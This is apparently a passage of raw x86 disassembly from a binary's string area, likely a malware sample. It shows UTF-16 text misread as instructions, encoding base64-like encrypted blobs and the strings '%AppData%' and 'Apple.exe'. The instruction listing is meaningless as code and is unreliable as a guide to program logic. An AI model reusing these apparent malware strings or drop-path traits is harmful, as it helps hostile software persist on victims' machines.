  4096a7:	6b 00 54             	imul   $0x54,(%eax),%eax
  4096aa:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  4096ae:	00 46 00             	add    %al,0x0(%esi)
  4096b1:	78 00                	js     0x4096b3
  4096b3:	4a                   	dec    %edx
  4096b4:	00 45 00             	add    %al,0x0(%ebp)
  4096b7:	6d                   	insl   (%dx),%es:(%edi)
  4096b8:	00 6f 00             	add    %ch,0x0(%edi)
  4096bb:	75 00                	jne    0x4096bd
  4096bd:	72 00                	jb     0x4096bf
  4096bf:	31 00                	xor    %eax,(%eax)
  4096c1:	53                   	push   %ebx
  4096c2:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  4096c6:	00 43 00             	add    %al,0x0(%ebx)
  4096c9:	62 00                	bound  %eax,(%eax)
  4096cb:	4e                   	dec    %esi
  4096cc:	00 7a 00             	add    %bh,0x0(%edx)
  4096cf:	72 00                	jb     0x4096d1
  4096d1:	54                   	push   %esp
  4096d2:	00 4b 00             	add    %cl,0x0(%ebx)
  4096d5:	6a 00                	push   $0x0
  4096d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4096d8:	00 6f 00             	add    %ch,0x0(%edi)
  4096db:	4e                   	dec    %esi
  4096dc:	00 6b 00             	add    %ch,0x0(%ebx)
  4096df:	73 00                	jae    0x4096e1
  4096e1:	56                   	push   %esi
  4096e2:	00 66 00             	add    %ah,0x0(%esi)
  4096e5:	00 80 d9 51 00 52    	add    %al,0x520051d9(%eax)
  4096eb:	00 69 00             	add    %ch,0x0(%ecx)
  4096ee:	69 00 70 00 44 00    	imul   $0x440070,(%eax),%eax
  4096f4:	4c                   	dec    %esp
  4096f5:	00 43 00             	add    %al,0x0(%ebx)
  4096f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4096f9:	00 77 00             	add    %dh,0x0(%edi)
  4096fc:	70 00                	jo     0x4096fe
  4096fe:	43                   	inc    %ebx
  4096ff:	00 75 00             	add    %dh,0x0(%ebp)
  409702:	2b 00                	sub    (%eax),%eax
  409704:	78 00                	js     0x409706
  409706:	45                   	inc    %ebp
  409707:	00 46 00             	add    %al,0x0(%esi)
  40970a:	31 00                	xor    %eax,(%eax)
  40970c:	2b 00                	sub    (%eax),%eax
  40970e:	37                   	aaa
  40970f:	00 48 00             	add    %cl,0x0(%eax)
  409712:	4f                   	dec    %edi
  409713:	00 61 00             	add    %ah,0x0(%ecx)
  409716:	35 00 71 00 7a       	xor    $0x7a007100,%eax
  40971b:	00 6b 00             	add    %ch,0x0(%ebx)
  40971e:	62 00                	bound  %eax,(%eax)
  409720:	39 00                	cmp    %eax,(%eax)
  409722:	42                   	inc    %edx
  409723:	00 32                	add    %dh,(%edx)
  409725:	00 73 00             	add    %dh,0x0(%ebx)
  409728:	4c                   	dec    %esp
  409729:	00 50 00             	add    %dl,0x0(%eax)
  40972c:	44                   	inc    %esp
  40972d:	00 66 00             	add    %ah,0x0(%esi)
  409730:	57                   	push   %edi
  409731:	00 53 00             	add    %dl,0x0(%ebx)
  409734:	33 00                	xor    (%eax),%eax
  409736:	75 00                	jne    0x409738
  409738:	4f                   	dec    %edi
  409739:	00 65 00             	add    %ah,0x0(%ebp)
  40973c:	37                   	aaa
  40973d:	00 30                	add    %dh,(%eax)
  40973f:	00 57 00             	add    %dl,0x0(%edi)
  409742:	5a                   	pop    %edx
  409743:	00 70 00             	add    %dh,0x0(%eax)
  409746:	79 00                	jns    0x409748
  409748:	75 00                	jne    0x40974a
  40974a:	68 00 6e 00 30       	push   $0x30006e00
  40974f:	00 4d 00             	add    %cl,0x0(%ebp)
  409752:	76 00                	jbe    0x409754
  409754:	35 00 59 00 6c       	xor    $0x6c005900,%eax
  409759:	00 71 00             	add    %dh,0x0(%ecx)
  40975c:	56                   	push   %esi
  40975d:	00 63 00             	add    %ah,0x0(%ebx)
  409760:	65 00 64 00 33       	add    %ah,%gs:0x33(%eax,%eax,1)
  409765:	00 58 00             	add    %bl,0x0(%eax)
  409768:	64 00 74 00 77       	add    %dh,%fs:0x77(%eax,%eax,1)
  40976d:	00 6d 00             	add    %ch,0x0(%ebp)
  409770:	41                   	inc    %ecx
  409771:	00 55 00             	add    %dl,0x0(%ebp)
  409774:	53                   	push   %ebx
  409775:	00 73 00             	add    %dh,0x0(%ebx)
  409778:	79 00                	jns    0x40977a
  40977a:	79 00                	jns    0x40977c
  40977c:	4e                   	dec    %esi
  40977d:	00 73 00             	add    %dh,0x0(%ebx)
  409780:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  409784:	75 00                	jne    0x409786
  409786:	4d                   	dec    %ebp
  409787:	00 58 00             	add    %bl,0x0(%eax)
  40978a:	36 00 35 00 66 00 42 	add    %dh,%ss:0x42006600
  409791:	00 70 00             	add    %dh,0x0(%eax)
  409794:	6e                   	outsb  %ds:(%esi),(%dx)
  409795:	00 69 00             	add    %ch,0x0(%ecx)
  409798:	6f                   	outsl  %ds:(%esi),(%dx)
  409799:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40979d:	00 61 00             	add    %ah,0x0(%ecx)
  4097a0:	4e                   	dec    %esi
  4097a1:	00 61 00             	add    %ah,0x0(%ecx)
  4097a4:	32 00                	xor    (%eax),%al
  4097a6:	55                   	push   %ebp
  4097a7:	00 4a 00             	add    %cl,0x0(%edx)
  4097aa:	31 00                	xor    %eax,(%eax)
  4097ac:	33 00                	xor    (%eax),%eax
  4097ae:	62 00                	bound  %eax,(%eax)
  4097b0:	79 00                	jns    0x4097b2
  4097b2:	33 00                	xor    (%eax),%eax
  4097b4:	5a                   	pop    %edx
  4097b5:	00 49 00             	add    %cl,0x0(%ecx)
  4097b8:	56                   	push   %esi
  4097b9:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  4097bd:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  4097c3:	30 00                	xor    %al,(%eax)
  4097c5:	50                   	push   %eax
  4097c6:	00 68 00             	add    %ch,0x0(%eax)
  4097c9:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  4097cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4097ce:	00 51 00             	add    %dl,0x0(%ecx)
  4097d1:	74 00                	je     0x4097d3
  4097d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d4:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  4097d8:	00 79 00             	add    %bh,0x0(%ecx)
  4097db:	46                   	inc    %esi
  4097dc:	00 75 00             	add    %dh,0x0(%ebp)
  4097df:	54                   	push   %esp
  4097e0:	00 78 00             	add    %bh,0x0(%eax)
  4097e3:	71 00                	jno    0x4097e5
  4097e5:	70 00                	jo     0x4097e7
  4097e7:	2f                   	das
  4097e8:	00 50 00             	add    %dl,0x0(%eax)
  4097eb:	51                   	push   %ecx
  4097ec:	00 30                	add    %dh,(%eax)
  4097ee:	00 50 00             	add    %dl,0x0(%eax)
  4097f1:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  4097f5:	6c                   	insb   (%dx),%es:(%edi)
  4097f6:	00 59 00             	add    %bl,0x0(%ecx)
  4097f9:	70 00                	jo     0x4097fb
  4097fb:	52                   	push   %edx
  4097fc:	00 71 00             	add    %dh,0x0(%ecx)
  4097ff:	5a                   	pop    %edx
  409800:	00 66 00             	add    %ah,0x0(%esi)
  409803:	52                   	push   %edx
  409804:	00 77 00             	add    %dh,0x0(%edi)
  409807:	55                   	push   %ebp
  409808:	00 6b 00             	add    %ch,0x0(%ebx)
  40980b:	57                   	push   %edi
  40980c:	00 58 00             	add    %bl,0x0(%eax)
  40980f:	58                   	pop    %eax
  409810:	00 50 00             	add    %dl,0x0(%eax)
  409813:	5a                   	pop    %edx
  409814:	00 42 00             	add    %al,0x0(%edx)
  409817:	68 00 58 00 6e       	push   $0x6e005800
  40981c:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  409820:	00 73 00             	add    %dh,0x0(%ebx)
  409823:	2f                   	das
  409824:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  409828:	00 73 00             	add    %dh,0x0(%ebx)
  40982b:	59                   	pop    %ecx
  40982c:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  409830:	00 31                	add    %dh,(%ecx)
  409832:	00 5a 00             	add    %bl,0x0(%edx)
  409835:	4c                   	dec    %esp
  409836:	00 70 00             	add    %dh,0x0(%eax)
  409839:	42                   	inc    %edx
  40983a:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40983e:	00 6e 00             	add    %ch,0x0(%esi)
  409841:	2f                   	das
  409842:	00 65 00             	add    %ah,0x0(%ebp)
  409845:	76 00                	jbe    0x409847
  409847:	52                   	push   %edx
  409848:	00 47 00             	add    %al,0x0(%edi)
  40984b:	41                   	inc    %ecx
  40984c:	00 41 00             	add    %al,0x0(%ecx)
  40984f:	50                   	push   %eax
  409850:	00 59 00             	add    %bl,0x0(%ecx)
  409853:	6f                   	outsl  %ds:(%esi),(%dx)
  409854:	00 45 00             	add    %al,0x0(%ebp)
  409857:	41                   	inc    %ecx
  409858:	00 35 00 36 00 75    	add    %dh,0x75003600
  40985e:	00 4f 00             	add    %cl,0x0(%edi)
  409861:	45                   	inc    %ebp
  409862:	00 46 00             	add    %al,0x0(%esi)
  409865:	6f                   	outsl  %ds:(%esi),(%dx)
  409866:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40986a:	00 56 00             	add    %dl,0x0(%esi)
  40986d:	51                   	push   %ecx
  40986e:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409874:	80 b1 70 00 63 00 75 	xorb   $0x75,0x630070(%ecx)
  40987b:	00 51 00             	add    %dl,0x0(%ecx)
  40987e:	74 00                	je     0x409880
  409880:	4f                   	dec    %edi
  409881:	00 37                	add    %dh,(%edi)
  409883:	00 4d 00             	add    %cl,0x0(%ebp)
  409886:	32 00                	xor    (%eax),%al
  409888:	33 00                	xor    (%eax),%eax
  40988a:	41                   	inc    %ecx
  40988b:	00 62 00             	add    %ah,0x0(%edx)
  40988e:	2f                   	das
  40988f:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  409893:	00 63 00             	add    %ah,0x0(%ebx)
  409896:	7a 00                	jp     0x409898
  409898:	4b                   	dec    %ebx
  409899:	00 70 00             	add    %dh,0x0(%eax)
  40989c:	75 00                	jne    0x40989e
  40989e:	68 00 6c 00 74       	push   $0x74006c00
  4098a3:	00 5a 00             	add    %bl,0x0(%edx)
  4098a6:	46                   	inc    %esi
  4098a7:	00 39                	add    %bh,(%ecx)
  4098a9:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4098ad:	00 55 00             	add    %dl,0x0(%ebp)
  4098b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4098b1:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  4098b5:	00 59 00             	add    %bl,0x0(%ecx)
  4098b8:	77 00                	ja     0x4098ba
  4098ba:	34 00                	xor    $0x0,%al
  4098bc:	69 00 54 00 31 00    	imul   $0x310054,(%eax),%eax
  4098c2:	41                   	inc    %ecx
  4098c3:	00 4e 00             	add    %cl,0x0(%esi)
  4098c6:	70 00                	jo     0x4098c8
  4098c8:	63 00                	arpl   %eax,(%eax)
  4098ca:	6a 00                	push   $0x0
  4098cc:	61                   	popa
  4098cd:	00 6d 00             	add    %ch,0x0(%ebp)
  4098d0:	6d                   	insl   (%dx),%es:(%edi)
  4098d1:	00 45 00             	add    %al,0x0(%ebp)
  4098d4:	6c                   	insb   (%dx),%es:(%edi)
  4098d5:	00 31                	add    %dh,(%ecx)
  4098d7:	00 77 00             	add    %dh,0x0(%edi)
  4098da:	50                   	push   %eax
  4098db:	00 4a 00             	add    %cl,0x0(%edx)
  4098de:	58                   	pop    %eax
  4098df:	00 70 00             	add    %dh,0x0(%eax)
  4098e2:	4a                   	dec    %edx
  4098e3:	00 5a 00             	add    %bl,0x0(%edx)
  4098e6:	5a                   	pop    %edx
  4098e7:	00 46 00             	add    %al,0x0(%esi)
  4098ea:	34 00                	xor    $0x0,%al
  4098ec:	4c                   	dec    %esp
  4098ed:	00 48 00             	add    %cl,0x0(%eax)
  4098f0:	69 00 78 00 31 00    	imul   $0x310078,(%eax),%eax
  4098f6:	50                   	push   %eax
  4098f7:	00 59 00             	add    %bl,0x0(%ecx)
  4098fa:	41                   	inc    %ecx
  4098fb:	00 48 00             	add    %cl,0x0(%eax)
  4098fe:	48                   	dec    %eax
  4098ff:	00 4f 00             	add    %cl,0x0(%edi)
  409902:	39 00                	cmp    %eax,(%eax)
  409904:	77 00                	ja     0x409906
  409906:	62 00                	bound  %eax,(%eax)
  409908:	50                   	push   %eax
  409909:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40990d:	00 68 00             	add    %ch,0x0(%eax)
  409910:	49                   	dec    %ecx
  409911:	00 78 00             	add    %bh,0x0(%eax)
  409914:	48                   	dec    %eax
  409915:	00 47 00             	add    %al,0x0(%edi)
  409918:	67 00 56 00          	add    %dl,0x0(%bp)
  40991c:	61                   	popa
  40991d:	00 79 00             	add    %bh,0x0(%ecx)
  409920:	77 00                	ja     0x409922
  409922:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409927:	13 25 00 41 00 70    	adc    0x70004100,%esp
  40992d:	00 70 00             	add    %dh,0x0(%eax)
  409930:	44                   	inc    %esp
  409931:	00 61 00             	add    %ah,0x0(%ecx)
  409934:	74 00                	je     0x409936
  409936:	61                   	popa
  409937:	00 25 00 00 13 41    	add    %ah,0x41130000
  40993d:	00 70 00             	add    %dh,0x0(%eax)
  409940:	70 00                	jo     0x409942
  409942:	6c                   	insb   (%dx),%es:(%edi)
  409943:	00 65 00             	add    %ah,0x0(%ebp)
  409946:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40994a:	78 00                	js     0x40994c
  40994c:	65 00 00             	add    %al,%gs:(%eax)
  40994f:	59                   	pop    %ecx
  409950:	53                   	push   %ebx
  409951:	00 6d 00             	add    %ch,0x0(%ebp)
  409954:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  409958:	57                   	push   %edi
  409959:	00 55 00             	add    %dl,0x0(%ebp)
  40995c:	64 00 33             	add    %dh,%fs:(%ebx)
  40995f:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  409963:	00 4a 00             	add    %cl,0x0(%edx)
  409966:	35 00 54 00 56       	xor    $0x56005400,%eax
  40996b:	00 46 00             	add    %al,0x0(%esi)
  40996e:	78 00                	js     0x409970
  409970:	51                   	push   %ecx
  409971:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  409975:	00 70 00             	add    %dh,0x0(%eax)
  409978:	52                   	push   %edx
  409979:	00 30                	add    %dh,(%eax)
  40997b:	00 68 00             	add    %ch,0x0(%eax)
  40997e:	4b                   	dec    %ebx
  40997f:	00 52 00             	add    %dl,0x0(%edx)
  409982:	6b 00 64             	imul   $0x64,(%eax),%eax
  409985:	00 32                	add    %dh,(%edx)
  409987:	00 59 00             	add    %bl,0x0(%ecx)
  40998a:	32 00                	xor    (%eax),%al
  40998c:	46                   	inc    %esi
  40998d:	00 45 00             	add    %al,0x0(%ebp)
  409990:	56                   	push   %esi
  409991:	00 6d 00             	add    %ch,0x0(%ebp)
  409994:	46                   	inc    %esi
  409995:	00 71 00             	add    %dh,0x0(%ecx)
  409998:	59                   	pop    %ecx
  409999:	00 55 00             	add    %dl,0x0(%ebp)
  40999c:	46                   	inc    %esi
  40999d:	00 48 00             	add    %cl,0x0(%eax)
  4099a0:	56                   	push   %esi
  4099a1:	00 56 00             	add    %dl,0x0(%esi)
  4099a4:	49                   	dec    %ecx
  4099a5:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  4099ab:	69 00 5a 00 34 00    	imul   $0x34005a,(%eax),%eax
  4099b1:	32 00                	xor    (%eax),%al
  4099b3:	37                   	aaa
  4099b4:	00 47 00             	add    %al,0x0(%edi)
  4099b7:	35 00 54 00 34       	xor    $0x34005400,%eax
  4099bc:	00 55 00             	add    %dl,0x0(%ebp)
  4099bf:	45                   	inc    %ebp
  4099c0:	00 59 00             	add    %bl,0x0(%ecx)
  4099c3:	71 00                	jno    0x4099c5
  4099c5:	72 00                	jb     0x4099c7
  4099c7:	48                   	dec    %eax
  4099c8:	00 2f                	add    %ch,(%edi)
  4099ca:	00 69 00             	add    %ch,0x0(%ecx)
  4099cd:	51                   	push   %ecx
  4099ce:	00 61 00             	add    %ah,0x0(%ecx)
  4099d1:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  4099d5:	52                   	push   %edx
  4099d6:	00 6d 00             	add    %ch,0x0(%ebp)
  4099d9:	33 00                	xor    (%eax),%eax
  4099db:	53                   	push   %ebx
  4099dc:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  4099e0:	00 70 00             	add    %dh,0x0(%eax)
  4099e3:	63 00                	arpl   %eax,(%eax)
  4099e5:	50                   	push   %eax
  4099e6:	00 41 00             	add    %al,0x0(%ecx)
  4099e9:	6b 00 34             	imul   $0x34,(%eax),%eax
  4099ec:	00 6f 00             	add    %ch,0x0(%edi)
  4099ef:	5a                   	pop    %edx
  4099f0:	00 47 00             	add    %al,0x0(%edi)
  4099f3:	4b                   	dec    %ebx
  4099f4:	00 77 00             	add    %dh,0x0(%edi)
  4099f7:	32 00                	xor    (%eax),%al
  4099f9:	62 00                	bound  %eax,(%eax)
  4099fb:	42                   	inc    %edx
  4099fc:	00 75 00             	add    %dh,0x0(%ebp)
  4099ff:	57                   	push   %edi
  409a00:	00 58 00             	add    %bl,0x0(%eax)
  409a03:	48                   	dec    %eax
  409a04:	00 68 00             	add    %ch,0x0(%eax)
  409a07:	66 00 38             	data16 add %bh,(%eax)
  409a0a:	00 42 00             	add    %al,0x0(%edx)
  409a0d:	58                   	pop    %eax
  409a0e:	00 62 00             	add    %ah,0x0(%edx)
  409a11:	47                   	inc    %edi
  409a12:	00 69 00             	add    %ch,0x0(%ecx)
  409a15:	39 00                	cmp    %eax,(%eax)
  409a17:	67 00 33             	add    %dh,(%bp,%di)
  409a1a:	00 61 00             	add    %ah,0x0(%ecx)
  409a1d:	59                   	pop    %ecx
  409a1e:	00 33                	add    %dh,(%ebx)
  409a20:	00 32                	add    %dh,(%edx)
  409a22:	00 72 00             	add    %dh,0x0(%edx)
  409a25:	71 00                	jno    0x409a27
  409a27:	39 00                	cmp    %eax,(%eax)
  409a29:	79 00                	jns    0x409a2b
  409a2b:	68 00 41 00 73       	push   $0x73004100
  409a30:	00 61 00             	add    %ah,0x0(%ecx)
  409a33:	38 00                	cmp    %al,(%eax)
  409a35:	68 00 52 00 50       	push   $0x50005200
  409a3a:	00 4b 00             	add    %cl,0x0(%ebx)
  409a3d:	67 00 66 00          	add    %ah,0x0(%bp)
  409a41:	4c                   	dec    %esp
  409a42:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  409a46:	00 56 00             	add    %dl,0x0(%esi)
  409a49:	6c                   	insb   (%dx),%es:(%edi)
  409a4a:	00 75 00             	add    %dh,0x0(%ebp)
  409a4d:	4c                   	dec    %esp
  409a4e:	00 6a 00             	add    %ch,0x0(%edx)
  409a51:	6e                   	outsb  %ds:(%esi),(%dx)
  409a52:	00 41 00             	add    %al,0x0(%ecx)
  409a55:	41                   	inc    %ecx
  409a56:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409a5c:	92                   	xchg   %eax,%edx
  409a5d:	01 76 00             	add    %esi,0x0(%esi)
  409a60:	77 00                	ja     0x409a62
  409a62:	54                   	push   %esp
  409a63:	00 55 00             	add    %dl,0x0(%ebp)
  409a66:	4a                   	dec    %edx
  409a67:	00 36                	add    %dh,(%esi)
  409a69:	00 69 00             	add    %ch,0x0(%ecx)
  409a6c:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  409a70:	6d                   	insl   (%dx),%es:(%edi)
  409a71:	00 2b                	add    %ch,(%ebx)
  409a73:	00 7a 00             	add    %bh,0x0(%edx)
  409a76:	50                   	push   %eax
  409a77:	00 50 00             	add    %dl,0x0(%eax)
  409a7a:	51                   	push   %ecx
  409a7b:	00 45 00             	add    %al,0x0(%ebp)
  409a7e:	62 00                	bound  %eax,(%eax)
  409a80:	4a                   	dec    %edx
  409a81:	00 53 00             	add    %dl,0x0(%ebx)
  409a84:	35 00 65 00 56       	xor    $0x56006500,%eax
  409a89:	00 70 00             	add    %dh,0x0(%eax)
  409a8c:	78 00                	js     0x409a8e
  409a8e:	2f                   	das
  409a8f:	00 4e 00             	add    %cl,0x0(%esi)
  409a92:	6b 00 46             	imul   $0x46,(%eax),%eax
  409a95:	00 6a 00             	add    %ch,0x0(%edx)
  409a98:	6c                   	insb   (%dx),%es:(%edi)
  409a99:	00 62 00             	add    %ah,0x0(%edx)
  409a9c:	6f                   	outsl  %ds:(%esi),(%dx)
  409a9d:	00 62 00             	add    %ah,0x0(%edx)
  409aa0:	42                   	inc    %edx
  409aa1:	00 51 00             	add    %dl,0x0(%ecx)
  409aa4:	37                   	aaa
  409aa5:	00 6e 00             	add    %ch,0x0(%esi)
  409aa8:	59                   	pop    %ecx
  409aa9:	00 6d 00             	add    %ch,0x0(%ebp)
  409aac:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  409ab0:	66 00 67 00          	data16 add %ah,0x0(%edi)
  409ab4:	6d                   	insl   (%dx),%es:(%edi)
  409ab5:	00 68 00             	add    %ch,0x0(%eax)
  409ab8:	6e                   	outsb  %ds:(%esi),(%dx)
  409ab9:	00 58 00             	add    %bl,0x0(%eax)
  409abc:	2f                   	das
  409abd:	00 67 00             	add    %ah,0x0(%edi)
  409ac0:	51                   	push   %ecx
  409ac1:	00 4b 00             	add    %cl,0x0(%ebx)
  409ac4:	44                   	inc    %esp
  409ac5:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  409ac9:	00 6e 00             	add    %ch,0x0(%esi)
  409acc:	73 00                	jae    0x409ace
  409ace:	69 00 6c 00 76 00    	imul   $0x76006c,(%eax),%eax
  409ad4:	36 00 74 00 46       	add    %dh,%ss:0x46(%eax,%eax,1)
  409ad9:	00 30                	add    %dh,(%eax)
  409adb:	00 35 00 79 00 51    	add    %dh,0x51007900
  409ae1:	00 6f 00             	add    %ch,0x0(%edi)
  409ae4:	68 00 6f 00 4e       	push   $0x4e006f00
  409ae9:	00 4d 00             	add    %cl,0x0(%ebp)
  409aec:	4d                   	dec    %ebp
  409aed:	00 39                	add    %bh,(%ecx)
  409aef:	00 4d 00             	add    %cl,0x0(%ebp)
  409af2:	41                   	inc    %ecx
  409af3:	00 58 00             	add    %bl,0x0(%eax)
  409af6:	79 00                	jns    0x409af8
  409af8:	4d                   	dec    %ebp
  409af9:	00 6d 00             	add    %ch,0x0(%ebp)
  409afc:	30 00                	xor    %al,(%eax)
  409afe:	59                   	pop    %ecx
  409aff:	00 57 00             	add    %dl,0x0(%edi)
  409b02:	59                   	pop    %ecx
  409b03:	00 63 00             	add    %ah,0x0(%ebx)
  409b06:	71 00                	jno    0x409b08
  409b08:	75 00                	jne    0x409b0a
  409b0a:	65 00 64 00 4d       	add    %ah,%gs:0x4d(%eax,%eax,1)
  409b0f:	00 6f 00             	add    %ch,0x0(%edi)
  409b12:	7a 00                	jp     0x409b14
  409b14:	58                   	pop    %eax
  409b15:	00 50 00             	add    %dl,0x0(%eax)
  409b18:	2f                   	das
  409b19:	00 46 00             	add    %al,0x0(%esi)
  409b1c:	38 00                	cmp    %al,(%eax)
  409b1e:	7a 00                	jp     0x409b20
  409b20:	50                   	push   %eax
  409b21:	00 45 00             	add    %al,0x0(%ebp)
  409b24:	4c                   	dec    %esp
  409b25:	00 46 00             	add    %al,0x0(%esi)
  409b28:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  409b2c:	56                   	push   %esi
  409b2d:	00 68 00             	add    %ch,0x0(%eax)
  409b30:	32 00                	xor    (%eax),%al
  409b32:	66 00 45 00          	data16 add %al,0x0(%ebp)
  409b36:	47                   	inc    %edi
  409b37:	00 73 00             	add    %dh,0x0(%ebx)
  409b3a:	54                   	push   %esp
  409b3b:	00 47 00             	add    %al,0x0(%edi)
  409b3e:	76 00                	jbe    0x409b40
  409b40:	37                   	aaa
  409b41:	00 56 00             	add    %dl,0x0(%esi)
  409b44:	73 00                	jae    0x409b46
  409b46:	62 00                	bound  %eax,(%eax)
  409b48:	47                   	inc    %edi
  409b49:	00 31                	add    %dh,(%ecx)
  409b4b:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  409b4f:	00 2f                	add    %ch,(%edi)
  409b51:	00 62 00             	add    %ah,0x0(%edx)
  409b54:	4f                   	dec    %edi
  409b55:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  409b59:	00 76 00             	add    %dh,0x0(%esi)
  409b5c:	4e                   	dec    %esi
  409b5d:	00 6d 00             	add    %ch,0x0(%ebp)
  409b60:	75 00                	jne    0x409b62
  409b62:	75 00                	jne    0x409b64
  409b64:	4e                   	dec    %esi
  409b65:	00 68 00             	add    %ch,0x0(%eax)
  409b68:	50                   	push   %eax
  409b69:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  409b6d:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  409b71:	00 61 00             	add    %ah,0x0(%ecx)
  409b74:	68 00 53 00 39       	push   $0x39005300
  409b79:	00 59 00             	add    %bl,0x0(%ecx)
  409b7c:	78 00                	js     0x409b7e
  409b7e:	5a                   	pop    %edx
  409b7f:	00 50 00             	add    %dl,0x0(%eax)
  409b82:	5a                   	pop    %edx
  409b83:	00 68 00             	add    %ch,0x0(%eax)
  409b86:	68 00 46 00 4c       	push   $0x4c004600
  409b8b:	00 77 00             	add    %dh,0x0(%edi)
  409b8e:	56                   	push   %esi
  409b8f:	00 38                	add    %bh,(%eax)
  409b91:	00 4f 00             	add    %cl,0x0(%edi)
  409b94:	37                   	aaa
  409b95:	00 32                	add    %dh,(%edx)
  409b97:	00 67 00             	add    %ah,0x0(%edi)
  409b9a:	39 00                	cmp    %eax,(%eax)
  409b9c:	7a 00                	jp     0x409b9e
  409b9e:	62 00                	bound  %eax,(%eax)
  409ba0:	68 00 78 00 79       	push   $0x79007800
  409ba5:	00 4b 00             	add    %cl,0x0(%ebx)
  409ba8:	58                   	pop    %eax
  409ba9:	00 75 00             	add    %dh,0x0(%ebp)
  409bac:	43                   	inc    %ebx
  409bad:	00 38                	add    %bh,(%eax)
  409baf:	00 56 00             	add    %dl,0x0(%esi)
  409bb2:	6b 00 38             	imul   $0x38,(%eax),%eax
  409bb5:	00 66 00             	add    %ah,0x0(%esi)
  409bb8:	48                   	dec    %eax
  409bb9:	00 4b 00             	add    %cl,0x0(%ebx)
  409bbc:	45                   	inc    %ebp
  409bbd:	00 38                	add    %bh,(%eax)
  409bbf:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  409bc3:	00 67 00             	add    %ah,0x0(%edi)
  409bc6:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  409bc9:	00 50 00             	add    %dl,0x0(%eax)
  409bcc:	32 00                	xor    (%eax),%al
  409bce:	2f                   	das
  409bcf:	00 72 00             	add    %dh,0x0(%edx)
  409bd2:	74 00                	je     0x409bd4
  409bd4:	42                   	inc    %edx
  409bd5:	00 6a 00             	add    %ch,0x0(%edx)
  409bd8:	55                   	push   %ebp
  409bd9:	00 70 00             	add    %dh,0x0(%eax)
  409bdc:	42                   	inc    %edx
  409bdd:	00 2b                	add    %ch,(%ebx)
  409bdf:	00 4a 00             	add    %cl,0x0(%edx)
  409be2:	44                   	inc    %esp
  409be3:	00 4d 00             	add    %cl,0x0(%ebp)
  409be6:	45                   	inc    %ebp
  409be7:	00 30                	add    %dh,(%eax)
  409be9:	00 4a 00             	add    %cl,0x0(%edx)
  409bec:	44                   	inc    %esp
  409bed:	00 37                	add    %dh,(%edi)
  409bef:	00 59 00             	add    %bl,0x0(%ecx)
  409bf2:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  409bf6:	53                   	push   %ebx
  409bf7:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  409bfb:	00 37                	add    %dh,(%edi)
  409bfd:	00 63 00             	add    %ah,0x0(%ebx)
  409c00:	45                   	inc    %ebp
  409c01:	00 69 00             	add    %ch,0x0(%ecx)
  409c04:	55                   	push   %ebp
  409c05:	00 52 00             	add    %dl,0x0(%edx)
  409c08:	41                   	inc    %ecx
  409c09:	00 58 00             	add    %bl,0x0(%eax)
  409c0c:	62 00                	bound  %eax,(%eax)
  409c0e:	56                   	push   %esi
  409c0f:	00 71 00             	add    %dh,0x0(%ecx)
  409c12:	4f                   	dec    %edi
  409c13:	00 63 00             	add    %ah,0x0(%ebx)
  409c16:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  409c1a:	79 00                	jns    0x409c1c
  409c1c:	49                   	dec    %ecx
  409c1d:	00 5a 00             	add    %bl,0x0(%edx)
  409c20:	58                   	pop    %eax
  409c21:	00 66 00             	add    %ah,0x0(%esi)
  409c24:	6b 00 57             	imul   $0x57,(%eax),%eax
  409c27:	00 62 00             	add    %ah,0x0(%edx)
  409c2a:	6c                   	insb   (%dx),%es:(%edi)
  409c2b:	00 4d 00             	add    %cl,0x0(%ebp)
  409c2e:	78 00                	js     0x409c30
  409c30:	37                   	aaa
  409c31:	00 32                	add    %dh,(%edx)
  409c33:	00 6f 00             	add    %ch,0x0(%edi)
  409c36:	55                   	push   %ebp
  409c37:	00 68 00             	add    %ch,0x0(%eax)
  409c3a:	70 00                	jo     0x409c3c
  409c3c:	63 00                	arpl   %eax,(%eax)
  409c3e:	48                   	dec    %eax
  409c3f:	00 58 00             	add    %bl,0x0(%eax)
